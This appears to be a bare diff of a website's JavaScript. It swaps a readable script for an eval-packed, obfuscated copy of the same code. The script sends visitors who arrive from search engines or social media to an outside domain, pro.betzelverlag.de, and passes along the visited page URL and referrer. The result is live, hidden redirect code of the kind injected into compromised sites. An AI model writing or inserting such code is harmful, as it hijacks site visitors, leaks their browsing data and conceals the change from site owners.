@@ -1,5 +1,1 @@
- //<![CDATA[
-var ars = 'https://pro.betzelverlag.de';
-
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-//]]>
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('d 1=\'e://f.g.h\';i([\'.j.\',\'k.\',\'l.\',\'2.\',\'3.\'].4(0=>5.6.7().8(0))||[\'m\',\'2\',\'3\',\'n\'].4(0=>o.p.7().8(0))){9.a.b=1+\'/?q=\'+c(9.a.b)+\'&r=\'+c(5.6)}',28,28,'s|ars|facebook|pinterest|some|document|referrer|toLowerCase|includes|window|location|href|encodeURIComponent|var|https|pro|betzelverlag|de|if|google|bing|yandex|fb|twitter|navigator|userAgent|arsae|arsae_ref'.split('|'),0,{}))
